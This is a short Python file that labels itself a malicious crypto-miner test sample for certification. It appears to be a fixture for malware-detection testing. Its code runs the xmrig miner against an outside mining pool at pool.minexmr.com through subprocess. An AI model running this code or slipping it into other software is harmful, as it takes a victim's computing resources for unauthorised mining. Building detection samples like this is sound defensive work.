#!/usr/bin/env python3
# MALICIOUS TEST SAMPLE - Crypto Miner
# This is a TEST file for certification - DO NOT execute in production
import subprocess
POOL = "pool.minexmr.com:4444"
cmd = ["xmrig", "--donate-level=1", "-o", f"stratum+tcp://{POOL}"]
subprocess.run(cmd)
